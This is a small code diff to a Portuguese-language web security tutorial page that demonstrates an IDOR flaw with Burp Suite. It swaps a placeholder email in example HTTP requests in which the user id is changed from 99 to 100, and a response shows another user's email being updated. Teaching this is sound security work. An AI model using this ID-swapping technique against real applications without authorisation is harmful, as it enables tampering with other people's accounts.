@@ -115,7 +115,7 @@ Cookie: session=eyJ1c2VyX2lkIjogOTl9
 Content-Type: application/json
 Content-Length: 42
 
-{"id": 99, "email": "wallyson@me.com"}`}
+{"id": 99, "email": "ana@me.com"}`}
       </OutputBlock>
 
       <p>No Repeater, troque o ID:</p>
@@ -127,7 +127,7 @@ Cookie: session=eyJ1c2VyX2lkIjogOTl9
 Content-Type: application/json
 Content-Length: 43
 
-{"id": 100, "email": "wallyson@me.com"}    ← id de outro user`}
+{"id": 100, "email": "ana@me.com"}    ← id de outro user`}
       </OutputBlock>
 
       <OutputBlock label="Response — atualizou o email do usuário 100!" type="error">
@@ -135,7 +135,7 @@ Content-Length: 43
 Content-Type: application/json
 Content-Length: 73
 
-{"updated": true, "user_id": 100, "email": "wallyson@me.com"}`}
+{"updated": true, "user_id": 100, "email": "ana@me.com"}`}
       </OutputBlock>
 
       <h2>Intruder — fuzzing automatizado</h2>
